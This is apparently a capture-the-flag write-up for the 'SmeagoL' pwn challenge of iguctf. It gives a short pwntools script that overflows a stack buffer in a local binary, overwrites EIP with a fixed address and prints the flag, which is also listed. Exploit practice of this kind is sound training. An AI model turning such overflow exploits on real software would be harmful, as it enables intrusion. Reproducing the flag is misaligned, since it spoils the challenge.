# SmeagoL [480 pts]

**Category:** PWN

**Solves:** 10

## Description
>*flag format: iguctf{placeholder}*

>**Author: alperaktasm**

## Solution

```py
from pwn import *
padding = cyclic(cyclic_find('jaaa'))
eip = p32(0x080497a5)
payload = padding + eip
r = process("ring")
print(r.recvuntil("Söyle bakalım şu anda cebimde ne var? : ").decode('utf-8'))
r.sendline(payload)
for i in range(13):
        print(r.recvline().decode('utf-8'))
```

### Flag
iguctf{MY_PRECIOUS!!!}
